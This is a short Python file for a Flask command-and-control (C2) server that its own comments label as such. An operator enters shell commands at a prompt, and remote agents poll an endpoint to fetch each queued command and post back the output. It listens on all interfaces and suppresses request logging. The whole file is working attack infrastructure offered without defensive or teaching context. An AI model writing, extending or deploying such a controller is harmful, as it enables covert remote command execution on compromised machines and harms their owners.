import queue
from flask import Flask, request, jsonify 
from prompt_toolkit import prompt
from prompt_toolkit.history import FileHistory
import threading
import logging

app = Flask(__name__)
app.config['COMPRESS_REGISTER'] = False

cmd_queue = queue.Queue()

# shell function to continuously prompt for commands and add them to the command queue
def shell():
    while True:
        cmd = prompt(f"shell>")
        if cmd:
            cmd_queue.put(cmd)

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# define a route to listener for C2 server
@app.route('/listen', methods=['POST', 'GET'])
def listen():
# inbound command from agent to C2 server
    if request.method == 'POST':
        data = request.get_json()
        print(data.get("output"))
        return jsonify({"status": "success"}), 200

# outbound command to C2 server    
    elif request.method == 'GET':
        try:
            cmd = cmd_queue.get_nowait()
            return jsonify({"cmd": cmd}), 200
        except queue.Empty:
            return jsonify({"cmd": None}), 200
        
if __name__ == '__main__':
    threading.Thread(target=shell, daemon=True).start()
    app.run(host='0.0.0.0', port=8080)
    